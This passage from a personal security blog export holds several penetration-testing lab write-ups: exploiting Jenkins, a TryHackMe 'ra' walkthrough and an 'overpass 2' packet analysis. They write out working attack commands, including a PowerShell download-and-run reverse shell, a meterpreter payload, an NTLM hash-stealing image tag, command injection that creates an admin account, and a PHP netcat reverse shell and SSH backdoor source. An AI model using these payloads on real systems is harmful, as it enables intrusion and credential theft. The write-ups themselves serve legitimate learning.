necessary.\n","date":"2022-10-23","permalink":"//localhost:1313/posts/gatekeeper/","section":"","summary":"","tags":[],"title":"gatekeeper (buffer overflows)"},{"categories":[],"contents":"if you\u0026rsquo;ve worked in any sort of SaaS/tech company, odds are you\u0026rsquo;ve used a CI/CD (continuous integration/continuous delivery and deployment) and DevOps tool. CI/CD is a method used to deliver apps to customers and clients by introducing automation into the stages of app development. it allows orgs to ship software \u0026ldquo;quickly\u0026rdquo; and \u0026ldquo;efficiently\u0026rdquo; (i used scare quotes because\u0026hellip;well, if you\u0026rsquo;ve worked in a software company you\u0026rsquo;ll know why). i\u0026rsquo;m going to see if i can try to exploit a common security misconfiguration on one of these tools, jenkins, then try to escalate privilege to get full system access.\nthe difference between CI and CD CI: involves devs making small changes and checks to their code. the scale of these changes can be huge so the process is automated to ensure that teams can build, test, and package their apps in a reliable way. CI can also help to streamline code changes.\nCD (continuous delivery): this is the automated delivery of completed code to environments like testing and development.\nCD (continuous deployment): every change that passes the automated tests is automatically placed in production, resulting in many production deployments. this is the ultimate goal of many companies, given they\u0026rsquo;re not constrained by regulatory or compliance requirements.\njenkins jenkins is an open-source CI/CD automation software, written in java. it\u0026rsquo;s used to implement CI/CD workflows, called pipelines.\npipelines automate testing and reporting on isolated changes in a larger code base (in real time) and facilitates integration of disparate branches of code into a main branch. pipelines also rapidly detect defects in a code base, build the software, automate testing of builds, prepare code base for deployment/delivery, and ultimately deploy code to containers and virtual machines (as well as bare metal and cloud servers).\nfor this experiment, i\u0026rsquo;ve spun up a windows VM that hosts the jenkins instance, and try to attack it from my kali VM.\nonce everything is set up, let\u0026rsquo;s start with a simple nmap scan of the target machine.\nnmap -sT -Pn -v 10.10.77.68 the service at port 8080 is the jenkins server. to visit it, simply enter http://10.10.77.68:8080. at the login page, i\u0026rsquo;ll enter my credentials (admin:admin) [note: default credentials for jenkins are usually admin:password or admin:admin] and be taken to the jenkins dashboard. there you\u0026rsquo;ll see a \u0026ldquo;project\u0026rdquo; that was created just for this experiment.\nsince this is a windows application, i\u0026rsquo;ll use the nishang repo for a script, more specifically this reverse shell script. nishang also contains a whole bunch of scripts for initial access, enumeration, and privesc so check them all out if you\u0026rsquo;d like.\nin kali, i created a directory to download the script to.\nwget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 now let\u0026rsquo;s create a simple web server so that this script can be downloaded into jenkins.\npython -m SimpleHTTPServer 80 back in jenkins, if you click \u0026ldquo;project\u0026rdquo; \u0026gt; configure \u0026gt; build, you\u0026rsquo;ll see a command box that lets you execute any command.\nfirst, start a netcat listener in kali.\nnc -lvnp 9001 in the jenkins command box, enter the following command to download the powershell script to the target. remember to use the address of the HTTP server that was created.\npowershell iex (New-Object Net.WebClient).DownloadString(\u0026#39;http://10.9.4.75:80/Invoke-PowerShellTcp.ps1\u0026#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.9.4.75 -Port 9001 save the build, then click \u0026ldquo;build now\u0026rdquo; from the project page. the netcat listener will receive a connection to the target.\nto make privesc easier, it\u0026rsquo;s better to switch to a meterpreter shell.\nfirst, create an msfvenom payload in the same directory we saved the powershell script to.\nmsfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.4.75 LPORT=9002 -f exe -o jenkins.exe download it to the machine similar to how we did it before, via the HTTP server and the build command box.\npowershell \u0026#34;(New-Object System.Net.WebClient).Downloadfile(\u0026#39;http://10.9.4.75:8000/jenkins.exe\u0026#39;,\u0026#39;jenkins.exe\u0026#39;)\u0026#34; save this build, but before building, let\u0026rsquo;s create a handler in metasploit to receive the connection.\n\u0026gt; use exploit/multi/handler \u0026gt; set PAYLOAD windows/meterpreter/reverse_tcp \u0026gt; set LHOST 10.9.4.75 \u0026gt; set LPORT 9002 \u0026gt; run back in jenkins, once you build and the payload has been downloaded to target, in the msfconsole shell type the following to get the meterpreter shell.\n\u0026gt; Start-Process \u0026#34;jenkins.exe\u0026#34; token impersonation to gain system access windows uses tokens to ensure accounts have the right privileges to carry out certain actions. tokens are assigned to an account when users log in or when they\u0026rsquo;re authenticated. this is usually done by LSASS.exe, generates the process responsible for authenticating users for the WINLOGON service. this is performed by using authentication packages like msgina.dll.\nonce authentication is successful, LSASS generates the user\u0026rsquo;s access token, which is used to launch the initial shell. other processes the user initiates then inherit this token.\nthe user\u0026rsquo;s access token consists of: user SIDs, group SIDs, privileges. you can read more about access tokens here .\nthere are 2 types of access tokens:\nprimary access tokens: associated with a user account, generated on log on impersonation tokens: allow a particular process to use the token of another the different levels of impersonation tokens:\nSecurityAnonymous: current user/client cannot impersonate another user/client SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client SecurityImpersonation: current user/client can impersonate the client\u0026rsquo;s security context on the local system SecurityDelegation: current user/client can impersonate the client\u0026rsquo;s security context on a remote system security context refers to the data structure that contain users\u0026rsquo; relevant security information.\nprivileges of an account allow the user to carry out particular actions. the most commonly abused privileges are:\nSeImpersonatePrivilege SeAssignPrimaryPrivilege SeTcbPrivilege SeBackupPrivilege SeRestorePrivilege SeCreateTokenPrivilege SeLoadDriverPrivilege SeTakeOwnershipPrivilege SeDebugPrivilege you can read more about them here .\nback in the meterpreter shell, we can check privs easily.\n\u0026gt; whoami /priv 2 privileges should show up: SeDebugPrivilege and SeImpersonatePrivilege. let\u0026rsquo;s use incognito mode to exploit this.\n\u0026gt; load incognito to check which tokens are available to us:\n\u0026gt; list_tokens -g the token BUILTIN\\Administrators is available. impersonating it should be easy.\n\u0026gt; impersonate_token \u0026#34;BUILTIN\\Administrators\u0026#34; it\u0026rsquo;s good practice to double check privileges.\n\u0026gt; getuid although we now have a higher privilege token, we may not actually have higher privilege permissions. windows uses a primary token of the process and not the impersonated token to determine what the process can do. so, we just migrate to a process with correct permissions. the safest process to pick is usually services.exe.\n\u0026gt; ps \u0026gt; migrate \u0026lt;PID\u0026gt; we\u0026rsquo;ve now migrated to an elevated process using its process ID (PID).\nso, there it is. we exploited jenkins to further exploit security misconfigurations to get root access on the target system. pretty cool!\n","date":"2022-01-08","permalink":"//localhost:1313/posts/jenkins/","section":"","summary":"","tags":[],"title":"jenkins"},{"categories":[],"contents":"hello!\nit\u0026rsquo;s been a while since my last post, but there\u0026rsquo;s a reason (i promise).\nas you may know, this past year i\u0026rsquo;ve been seriously pursuing security as both a passion and possible career. it\u0026rsquo;s been a fun time learning and a not-so-fun time applying for jobs (i believe i might have applied to 300+ jobs \u0026ndash; seriously). the great news is that i\u0026rsquo;ve finally got a job as a security researcher for trustwave\u0026rsquo;s spiderlabs .\ni am beyond excited for this new opportunity, as well as a little nervous (but mostly excited). i\u0026rsquo;ve been recruited for the database security (DST) team, specifically because of my experience as a database developer, my extensive work with MS SQL Server, and my laziness that resulted in automating large chunks of my (old) job. through my education in the past year, i\u0026rsquo;ve also been exposed to postgreSQL, MySQL, MariaDB, and more. it might have also helped that most of my team are also electrical engineering grads that are now almost completely detached from the field.\nthat said, i don\u0026rsquo;t think the future posts on this site will be rigidly database related. since we at spiderlabs get a \u0026ldquo;hackday\u0026rdquo; (a day devoted to researching any topic we like), i might be focused on writing posts related to whatever i\u0026rsquo;m working on at that moment. i\u0026rsquo;m also still studying for my eCPPT exam, though it had taken a backseat due to personal factors, so i will attempt to write more deeply about the topics in that course.\ni\u0026rsquo;d just like to take this moment to thank whoever has been reading my ramblings, and i hope you\u0026rsquo;ve learned something from them. here\u0026rsquo;s to a more fulfilling year ahead!\n","date":"2022-01-08","permalink":"//localhost:1313/posts/update/","section":"","summary":"","tags":[],"title":"update"},{"categories":[],"contents":"as i\u0026rsquo;ve been studying and preparing for my next big certification, the eCPPT (certified professional penetration tester), i had to remind myself to try and keep my skills sharp. since the course material for the eCPPT goes deeply into the fundamentals of topics like assembly, social engineering, etc., i\u0026rsquo;ve had to take time away from it to keep practicing all that i\u0026rsquo;ve learned so far. \u0026ldquo;ra\u0026rdquo; happened to be the most challenging room i\u0026rsquo;ve done until now, but i\u0026rsquo;m sure there are more to come, that take even more skills into account.\nthe story with the room is that there\u0026rsquo;s a mega corporation called WindCorp, and they like to brag about the fact that they\u0026rsquo;re \u0026ldquo;unhackable\u0026rdquo;. in this story, we\u0026rsquo;re a hacker trying to make them eat their words, and we\u0026rsquo;ll be exploiting a windows machine that we\u0026rsquo;ve spotted.\nas usual, we get a target IP address: 10.10.75.59\nand again, we\u0026rsquo;ll start off with an nmap scan (and save the results):\nnmap -sC -sV -Pn -oN openports.txt 10.10.75.79 i\u0026rsquo;ll trim the fat:\n53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-10-27 18:06:06Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name) 443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 2179/tcp open vmrdp? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? 3389/tcp open ms-wbt-server Microsoft Terminal Services 5222/tcp open jabber Ignite Realtime Openfire Jabber server 3.10.0 or later 5269/tcp open xmpp Wildfire XMPP Client 7070/tcp open http Jetty 9.4.18.v20190429 7443/tcp open ssl/http Jetty 9.4.18.v20190429 7777/tcp open socks5 (No authentication; connection failed) 9090/tcp open zeus-admin? 9091/tcp open ssl/xmltec-xmlmail? we can see a bunch of services running across a variety of ports. the key here is to not be overwhelmed, and start small. some (or a lot) of these services could even just be rabbit holes waiting to be traversed.\ni modified the /etc/hosts file and added windcorp.thm (DNS domain name) and fire.windcorp.thm (DNS computer name).\nlet\u0026rsquo;s visit http://windcorp.thm .\nthe search bar on the site doesn\u0026rsquo;t work, but the \u0026ldquo;reset password\u0026rdquo; link does.\ni have no idea how to fill in these fields, so i\u0026rsquo;m going to continue digging around the site.\nscrolling down a bit, and we can see a list of employees:\nAntonietta Vidal Britney Palmer Brittany Cruz Carla Meyer Buse Candan Edeltraut Daub Edward Lewis Emile Lavoie Emile Henry Emily Anderson Hemmo Boschma Isabella Hughes Isra Saur Jackson Vasquez Jaqueline Dittmer Emily Jensen Lily Levesque Kirk Uglas let\u0026rsquo;s save these names to a file (users.txt), then break up the names so we can search the site\u0026rsquo;s source to see if they pop in any form anywhere else.\ncat users.txt | tr -s \u0026#39; \u0026#39; \u0026#39;\\n\u0026#39; \u0026gt; userslist.txt the output (userslist.txt) now looks like:\nAntonietta Vidal Britney Palmer Brittany Cruz Carla Meyer Buse Candan Edeltraut Daub Edward Lewis Emile Lavoie Emile Henry Emily Anderson Hemmo Boschma Isabella Hughes Isra Saur Jackson Vasquez Jaqueline Dittmer Emily Jensen Lily Levesque Kirk Uglas now let\u0026rsquo;s feed this list to a curl command:\ncurl http://windcorp.thm | egrep -i -f userslist.txt we can see the names pop up in some email addresses, but towards the end we can see the names pop up in what appear to be some images. the image that caught my eye was lilyleAndSparky.jpg.\ncould this be the key to resetting the password? we have a username: lilyle (lily levesque) and the name \u0026ldquo;sparky\u0026rdquo; (probably her dog\u0026rsquo;s name). one of the security questions was \u0026ldquo;what is/was your favorite pets name?\u0026rdquo;. let\u0026rsquo;s try it.\nwow, it actually worked. which is good, because if it didn\u0026rsquo;t i would really not know what to do next and would have to rethink my whole attack.\narmed with these credentials (lilyle:ChangeMe#1234), let\u0026rsquo;s enumerate the SMB shares and try to log into one of them.\nsmbclient -L 10.10.75.59 -U lilyle enter the password when prompted.\nwe can also use:\nsmbmap -u lilyle -p ChangeMe#1234 -H windcorp.thm let\u0026rsquo;s try to login to the \u0026ldquo;Shared\u0026rdquo; share.\nsmbclient \\\\\\\\10.10.75.59\\\\Shared -U lilyle --password ChangeMe#1234 we can see there\u0026rsquo;s a flag stored right there, along with installers for an application called \u0026ldquo;spark\u0026rdquo;.\nlet\u0026rsquo;s download both the flag, and the .deb installer.\nget \u0026#34;Flag 1.txt\u0026#34; get spark_2_8_3.deb if the installer is too big for your network connection, the connection will timeout. in that case, you can try curl:\ncurl -u \u0026#34;windcorp.thm\\lilyle:ChangeMe#1234\u0026#34; smb://windcorp.thm/Shared/spark_2_8_3.deb this didn\u0026rsquo;t work for me either, so i tried to download and install the tarball package (spark_2_8_3.tar.gz). when that also didn\u0026rsquo;t work, i ended up finding an installer on the internet and just downloaded then installed that. the version difference in this case didn\u0026rsquo;t matter, but in a real-life scenario, versions are often very important, and some exploits don\u0026rsquo;t work with later versions of applications.\nonce you\u0026rsquo;ve downloaded spark, try to get some info on the package.\ndpkg-deb -I spark_2_8_3.deb it\u0026rsquo;s a \u0026ldquo;cross-platform real-time collaboration client optimized for business and organizations\u0026rdquo;.\nbasically, it\u0026rsquo;s an IM client or chat app.\nwhen it\u0026rsquo;s installed, try to use the credentials lilyle:ChangeMe#1234 to log in.\nthe login fails, because the app wasn\u0026rsquo;t able to verify the certificate. no matter, because we can go into the advanced settings of the app and select the option \u0026ldquo;accept all certificates\u0026rdquo; and disable \u0026ldquo;certificate hostname verification\u0026rdquo;.\nnow, we can log in.\nwe see there\u0026rsquo;s a conference room, but no one is in it. the app looks pretty empty.\nwhen dealing with apps like this, it\u0026rsquo;s good practice to start searching vuln databases to see if any exploit exists. a good place to check is https://attackerkb.com/ searching for \u0026ldquo;spark exploits\u0026rdquo; leads us to CVE-2020-12772.\nin a nutshell, this exploit allows us to send an \u0026ldquo;image\u0026rdquo; to a contact, but the SRC attribute of the image will refer our IP address. when the contact clicks this link, their hashes will be sent with the HTTP request. to receive this data, we\u0026rsquo;ll need to run Responder.py.\nnow we need to select a target. if you remember, the site had a list of technical staff and their status (online/offline). going back to the site, we see that the user \u0026ldquo;buse\u0026rdquo; is online. let\u0026rsquo;s target them.\nfirst, run responder:\n/opt/Responder/Responder.py now, send the following \u0026ldquo;image\u0026rdquo; to buse:\n\u0026lt;img src=\u0026#34;http://10.9.6.194/bilal.jpg\u0026gt; wait for buse to click the link\u0026hellip;\nwe receive a hash, in the NTLMv2 format. hopefully, we can crack it with hashcat (and rockyou.txt):\nhashcat.exe -a 0 -m 5600 \u0026#34;buse::WINDCORP:1122334455667788:96320659CCC8CCD0C23852F82AA669C8:0101000000000000792F24210DCCD701CB9891E68DB963FB000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000B25F9F074A7F2B076C71892C3D7F9B988260CA42BCBEB4E1863C7810B3FF276D0A00100000000000000000000000000000000000090000000000000000000000\u0026#34; C:\\rockyou.txt upon a successful crack, we\u0026rsquo;ll get the password uzunLM+3131. great- ! now we have another set of credentials \u0026ndash; buse:uzunLM+3131\nnote: i do recommend saving found/cracked credentials in a text file. that way we\u0026rsquo;re not constantly scrolling through terminal trying to find them.\necho \u0026#34;buse:uzunLM+3131\u0026#34; \u0026gt; creds.txt now we get to use one of my favourite tools ever: evil winrm . if you don\u0026rsquo;t know, evil winrm is basically the go-to tool, sometimes used by sysadmins but mostly by hackers, to remotely access a windows machine. it\u0026rsquo;s extremely useful in the post-exploitation phase.\nevil-winrm -u buse -p uzunLM+3131 -i windcorp.thm this will log us in as buse, and upon poking around, you\u0026rsquo;ll locate the 2nd flag.\nwhat\u0026rsquo;s more interesting though, and which proves to eventually be vital in privilege escalation, is a folder in C:\\ that contains a powershell script and its log.\nthe code for the checkservers.ps1 script is as follows:\n# reset the lists of hosts prior to looping $OutageHosts = $Null # specify the time you want email notifications resent for hosts that are down $EmailTimeOut = 30 # specify the time you want to cycle through your host lists. $SleepTimeOut = 45 # specify the maximum hosts that can be down before the script is aborted $MaxOutageCount = 10 # specify who gets notified $notificationto = \u0026#34;brittanycr@windcorp.thm\u0026#34; # specify where the notifications come from $notificationfrom = \u0026#34;admin@windcorp.thm\u0026#34; # specify the SMTP server $smtpserver = \u0026#34;relay.windcorp.thm\u0026#34; # start looping here Do{ $available = $Null $notavailable = $Null Write-Host (Get-Date) # Read the File with the Hosts every cycle, this way to can add/remove hosts # from the list without touching the script/scheduled task, # also hash/comment (#) out any hosts that are going for maintenance or are down. get-content C:\\Users\\brittanycr\\hosts.txt | Where-Object {!($_ -match \u0026#34;#\u0026#34;)} | ForEach-Object { $p = \u0026#34;Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue\u0026#34; Invoke-Expression $p if($p) { # if the Host is available then just write it to the screen write-host \u0026#34;Available host ---\u0026gt; \u0026#34;$_ -BackgroundColor Green -ForegroundColor White [Array]$available += $_ } else { # If the host is unavailable, give a warning to screen write-host \u0026#34;Unavailable host ------------\u0026gt; \u0026#34;$_ -BackgroundColor Magenta -ForegroundColor White $p = Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue if(!($p)) { # If the host is still unavailable for 4 full pings, write error and send email write-host \u0026#34;Unavailable host ------------\u0026gt; \u0026#34;$_ -BackgroundColor Red -ForegroundColor White [Array]$notavailable += $_ if ($OutageHosts -ne $Null) { if (!$OutageHosts.ContainsKey($_)) { # First time down add to the list and send email Write-Host \u0026#34;$_ Is not in the OutageHosts list, first time down\u0026#34; $OutageHosts.Add($_,(get-date)) $Now = Get-date $Body = \u0026#34;$_ has not responded for 5 pings at $Now\u0026#34; Send-MailMessage -Body \u0026#34;$body\u0026#34; -to $notificationto -from $notificationfrom ` -Subject \u0026#34;Host $_ is down\u0026#34; -SmtpServer $smtpserver } else { # If the host is in the list do nothing for 1 hour and then remove from the list. Write-Host \u0026#34;$_ Is in the OutageHosts list\u0026#34; if (((Get-Date) - $OutageHosts.Item($_)).TotalMinutes -gt $EmailTimeOut) {$OutageHosts.Remove($_)} } } else { # First time down create the list and send email Write-Host \u0026#34;Adding $_ to OutageHosts.\u0026#34; $OutageHosts = @{$_=(get-date)} $Body = \u0026#34;$_ has not responded for 5 pings at $Now\u0026#34; Send-MailMessage -Body \u0026#34;$body\u0026#34; -to $notificationto -from $notificationfrom ` -Subject \u0026#34;Host $_ is down\u0026#34; -SmtpServer $smtpserver } } } } # Report to screen the details $log = \u0026#34;Last run: $(Get-Date)\u0026#34; write-host $log Set-Content -Path C:\\scripts\\log.txt -Value $log Write-Host \u0026#34;Available count:\u0026#34;$available.count Write-Host \u0026#34;Not available count:\u0026#34;$notavailable.count Write-Host \u0026#34;Not available hosts:\u0026#34; $OutageHosts Write-Host \u0026#34;\u0026#34; Write-Host \u0026#34;Sleeping $SleepTimeOut seconds\u0026#34; sleep $SleepTimeOut if ($OutageHosts.Count -gt $MaxOutageCount) { # If there are more than a certain number of host down in an hour abort the script. $Exit = $True $body = $OutageHosts | Out-String Send-MailMessage -Body \u0026#34;$body\u0026#34; -to $notificationto -from $notificationfrom ` -Subject \u0026#34;More than $MaxOutageCount Hosts down, monitoring aborted\u0026#34; -SmtpServer $smtpServer } } while ($Exit -ne $True) it looks like this code is checking the status of some hosts every 1 minute, from a file stored at C:\\Users\\brittanycr\\hosts.txt.\nwhen we try to read brittanycr\u0026rsquo;s directories, our access is denied.\nif we run the command whoami /groups as buse, we\u0026rsquo;ll see that buse is in the group \u0026ldquo;account operators\u0026rdquo;.\naccount operators can change passwords for other users, which means buse can change the password for brittanycr.\nnet user brittanycr wEiRdP@$$W0rd1234! /domain (i chose this password because it complies with the password policy.)\nonce the password has been changed, let\u0026rsquo;s try to get that file at C:\\Users\\brittanycr\\hosts.txt. since the checkservers.ps1 script reads from this file without being too annoying about checking what\u0026rsquo;s in it, we\u0026rsquo;re gonna inject a little bit of code into it and get the script to run it. this will be our ticket into getting root access.\ngetting in:\nsmbclient \\\\\\\\windcorp.thm\\\\Users -U brittanycr --password wEiRdP@$$W0rd1234! navigate to the folder above and download the hosts.txt file, then edit it to add the following bit of code:\n; net user bilal \u0026#39;p*s$w0rd123\u0026#39; /add; net localgroup Administrators bilal /add when the script performs this little maneuver, it will inadvertently create a user \u0026ldquo;bilal\u0026rdquo;, and add me to the Administrators group heh heh.\nwe have to replace the previous hosts.txt file with the new one. we can do this using the upload command in brittanycr\u0026rsquo;s evil winrm instance.\nnow if we navigate to buse\u0026rsquo;s \u0026ldquo;scripts\u0026rdquo; folder, keep checking the log file to see if the script has been successfully run. it might be a bit of a wait, but if you\u0026rsquo;re patient, you\u0026rsquo;ll see the script will have run.\nwe should now be able to access the network with our new (root) credentials.\nhmmm, evil winrm is failing to log me in. maybe we can use another tool?\nfirst, i have to check if my credentials are actually root. to do this, let\u0026rsquo;s use crackmapexec , a badass tool that quickly assesses the security of large AD networks. if it says we have access, i\u0026rsquo;ll use psexec.py to log in.\ncrackmapexec smb windcorp.thm -u bilal -p \u0026#39;p*s$w0rd123\u0026#39; python3 /usr/share/doc/python3-impacket/examples/psexec.py bilal@windcorp.thm hell yeah, we\u0026rsquo;re in.\nthat was a hell of a ride. from doing a bit of recon on the company\u0026rsquo;s users, sending fake links to IT, getting their hash then password, then injecting our own malicious code into a routine script to get root\u0026hellip;i guess WindCorp isn\u0026rsquo;t unhackable after all :)\n","date":"2021-11-10","permalink":"//localhost:1313/posts/ra/","section":"","summary":"","tags":[],"title":"tryhackme: ra"},{"categories":[],"contents":"i\u0026rsquo;m going to talk about one of my favourite rooms on thm, and that is overpass 2. overpass 2 is the 7th room in the \u0026ldquo;advanced exploitation\u0026rdquo; chapter, of the \u0026ldquo;offensive pentesting\u0026rdquo; path. it\u0026rsquo;s also the 2nd room in the overpass series, which is about a bunch of computer science students trying to run a company called \u0026ldquo;overpass\u0026rdquo;.\nthis room is interesting and different because the \u0026ldquo;target\u0026rdquo; in question has already been hacked, and it\u0026rsquo;s our job to figure out how and if we can use the information left behind by the attacker to get back into the overpass network.\nthe overpass SOC team managed to capture the packets in wireshark during the attack, and save them as a .pcap file. we\u0026rsquo;ve been given the .pcap file to analyze, so let\u0026rsquo;s go ahead and do that.\nthis is what we first see when we open the file in wireshark. it\u0026rsquo;s a lot of information, but we can see a bunch of TCP and HTTP requests made from a source (192.168.170.145) to a destination (192.168.170.159).\nlet\u0026rsquo;s set a display filter so we only see the HTTP requests. we can do this by entering http in the \u0026ldquo;apply a display filter\u0026rdquo; field.\nwe can see that the source (attacker?) requested the /development/ URL. the first packet has the GET /development/ request header. the server responds, and then the source makes a POST request to an upload form of sorts (header POST /development/upload.php).\nif we right-click on the packet, and click \u0026ldquo;follow TCP stream\u0026rdquo;, it will show us the information that was contained within that packet.\nwe can see that the source/attacker uploaded a .php file called \u0026ldquo;payload.php\u0026rdquo;. doesn\u0026rsquo;t leave much to the imagination, does it? right under that, we can see the payload\u0026rsquo;s code in clear text:\n\u0026lt;?php exec(\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.170.145 4242 \u0026gt;/tmp/f\u0026#34;)?\u0026gt; this script would have created a php reverse shell, which the attacker would control using netcat. the shell would have connected to port 4242.\nthe good (and bad) thing about using netcat to control reverse shells is that all the traffic is unencrypted, and should be visible in stream data that is captured.\nlet\u0026rsquo;s apply a TCP stream filter to see the contents of the traffic. in the display filter field, type tcp.stream eq 3.\nthis stream has captured all the traffic that was traveling through the attacker\u0026rsquo;s shell. we can see that they logged in as a low privilege user \u0026ldquo;james\u0026rdquo; and used the password \u0026ldquo;whenevernoteartinstant\u0026rdquo;. attacker then runs sudo -l to see what commands james can run, and turns out james can run pretty much anything. this means that james isn\u0026rsquo;t exactly a low privilege user!\nthe attacker then dumps the contents of the /etc/shadow file. this file, as you may know, contains all the secure user account information. it stores actual passwords\u0026rsquo; hashes. we can see that some user hashes were dumped as well:\njames:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7::: paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7::: szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7::: bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7::: muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7::: we can attempt to crack these hashes using john. first, let\u0026rsquo;s identify the hashes. you can use any tool you prefer. i used the hash-identifier tool on my machine. hopefully, you will be able to identify it as sha512crypt.\nsave the hashes to a file, and run john to crack them using the following command:\njohn -w=/usr/share/wordlists/fasttrack.txt --format=crypt systemhashes.txt we were able to crack 4 users\u0026rsquo; passwords.\nright after dumping the hashes, the attacker then tries to establish persistence via an SSH backdoor. they cloned a repo from github, known as ssh-backdoor . they then generate a public/private key pair. the attacker modifies the permissions on the backdoor using chmod +x backdoor and then login to it using:\n./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed the backdoor connects over the port 2222.\nlet\u0026rsquo;s visit the github repo above and try to analyze the main code.\npackage main import ( \u0026#34;crypto/sha512\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;github.com/creack/pty\u0026#34; \u0026#34;github.com/gliderlabs/ssh\u0026#34; \u0026#34;github.com/integrii/flaggy\u0026#34; gossh \u0026#34;golang.org/x/crypto/ssh\u0026#34; \u0026#34;golang.org/x/crypto/ssh/terminal\u0026#34; ) var hash string = \u0026#34;bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3\u0026#34; func main() { var ( lport uint = 2222 lhost net.IP = net.ParseIP(\u0026#34;0.0.0.0\u0026#34;) keyPath string = \u0026#34;id_rsa\u0026#34; fingerprint string = \u0026#34;OpenSSH_8.2p1 Debian-4\u0026#34; ) flaggy.UInt(\u0026amp;lport, \u0026#34;p\u0026#34;, \u0026#34;port\u0026#34;, \u0026#34;Local port to listen for SSH on\u0026#34;) flaggy.IP(\u0026amp;lhost, \u0026#34;i\u0026#34;, \u0026#34;interface\u0026#34;, \u0026#34;IP address for the interface to listen on\u0026#34;) flaggy.String(\u0026amp;keyPath, \u0026#34;k\u0026#34;, \u0026#34;key\u0026#34;, \u0026#34;Path to private key for SSH server\u0026#34;) flaggy.String(\u0026amp;fingerprint, \u0026#34;f\u0026#34;, \u0026#34;fingerprint\u0026#34;, \u0026#34;SSH Fingerprint, excluding the SSH-2.0- prefix\u0026#34;) flaggy.String(\u0026amp;hash, \u0026#34;a\u0026#34;, \u0026#34;hash\u0026#34;, \u0026#34;Hash for backdoor\u0026#34;) flaggy.Parse() log.SetPrefix(\u0026#34;SSH - \u0026#34;) privKeyBytes, err := ioutil.ReadFile(keyPath) if err != nil { log.Panicln(\u0026#34;Error reading privkey:\\t\u0026#34;, err.Error()) } privateKey, err := gossh.ParsePrivateKey(privKeyBytes) if err != nil { log.Panicln(\u0026#34;Error parsing privkey:\\t\u0026#34;, err.Error()) } server := \u0026amp;ssh.Server{ Addr: fmt.Sprintf(\u0026#34;%s:%v\u0026#34;, lhost.String(), lport), Handler: sshterminal, Version: fingerprint, PasswordHandler: passwordHandler, } server.AddHostKey(privateKey) log.Println(\u0026#34;Started SSH backdoor on\u0026#34;, server.Addr) log.Fatal(server.ListenAndServe()) } func verifyPass(hash, salt, password string) bool { resultHash := hashPassword(password, salt) return resultHash == hash } func hashPassword(password string, salt string) string { hash := sha512.Sum512([]byte(password + salt)) return fmt.Sprintf(\u0026#34;%x\u0026#34;, hash) } func sshHandler(s ssh.Session) { command := s.RawCommand() if command != \u0026#34;\u0026#34; { s.Write(runCommand(command)) return } term := terminal.NewTerminal(s, \u0026#34;$ \u0026#34;) for { command, _ = term.ReadLine() if command == \u0026#34;exit\u0026#34; { return } term.Write(runCommand(command)) } } func sshterminal(s ssh.Session) { cmd := exec.Command(\u0026#34;/bin/bash\u0026#34;, \u0026#34;-i\u0026#34;) ptyReq, _, isPty := s.Pty() if isPty { cmd.Env = append(cmd.Env, fmt.Sprintf(\u0026#34;TERM=%s\u0026#34;, ptyReq.Term)) f, err := pty.Start(cmd) if err != nil { panic(err) } go func() { io.Copy(f, s) // stdin }() io.Copy(s, f) // stdout cmd.Wait() } else { io.WriteString(s, \u0026#34;No PTY requested.\\n\u0026#34;) s.Exit(1) } } func runCommand(cmd string) []byte { result := exec.Command(\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd) response, _ := result.CombinedOutput() return response } func passwordHandler(_ ssh.Context, password string) bool { return verifyPass(hash, \u0026#34;1c362db832f3f864c8c2fe05f2002a05\u0026#34;, password) we can see that the program first assigns a default hash:\nvar hash string = 